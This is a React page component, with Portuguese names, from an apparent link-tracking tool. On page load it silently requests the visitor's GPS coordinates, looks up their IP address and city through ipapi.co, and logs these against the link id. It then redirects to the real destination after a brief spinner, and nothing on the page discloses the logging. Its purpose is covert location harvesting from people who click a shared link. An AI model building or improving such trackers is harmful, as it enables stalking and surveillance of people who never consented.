import React, { useEffect, useState } from 'react';

export default function TrackerPage() {
  const [ok, setOk] = useState(false);

  useEffect(() => {
    async function coletar() {
      const id = window.location.pathname.split('/').pop();
      let destino = '';
      let acesso = {
        ip: 'Desconhecido',
        loc: 'Desconhecida',
        data: new Date().toLocaleString('pt-BR')
      };
      function salvarAcesso() {
        const links = JSON.parse(localStorage.getItem('links') || '[]');
        const idx = links.findIndex(l => l.id === id);
        if (idx !== -1) {
          destino = links[idx].destino;
          links[idx].acessos.unshift(acesso);
          localStorage.setItem('links', JSON.stringify(links));
        }
        setOk(true);
        setTimeout(() => {
          if (destino) window.location.href = destino;
        }, 1500);
      }
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            acesso.loc = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`;
            acesso.gps = true;
            fetch('https://ipapi.co/json/')
              .then(resp => resp.json())
              .then(data => {
                acesso.ip = data.ip;
                salvarAcesso();
              })
              .catch(() => salvarAcesso());
          },
          err => {
            fetch('https://ipapi.co/json/')
              .then(resp => resp.json())
              .then(data => {
                acesso.ip = data.ip;
                acesso.loc = data.city + ', ' + data.region + ' - ' + data.country_name;
                acesso.gps = false;
                salvarAcesso();
              })
              .catch(() => salvarAcesso());
          },
          { timeout: 5000 }
        );
      } else {
        fetch('https://ipapi.co/json/')
          .then(resp => resp.json())
          .then(data => {
            acesso.ip = data.ip;
            acesso.loc = data.city + ', ' + data.region + ' - ' + data.country_name;
            acesso.gps = false;
            salvarAcesso();
          })
          .catch(() => salvarAcesso());
      }
    }
    coletar();
  }, []);

  return (
    <div style={{
      minHeight: '100vh',
      background: 'var(--preto-espionagem)',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      textAlign: 'center'
    }}>
      <div style={{
        width: 60,
        height: 60,
        border: '6px solid #222',
        borderTop: '6px solid #E60033',
        borderRadius: '50%',
        animation: 'spin 1s linear infinite'
      }} />
      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}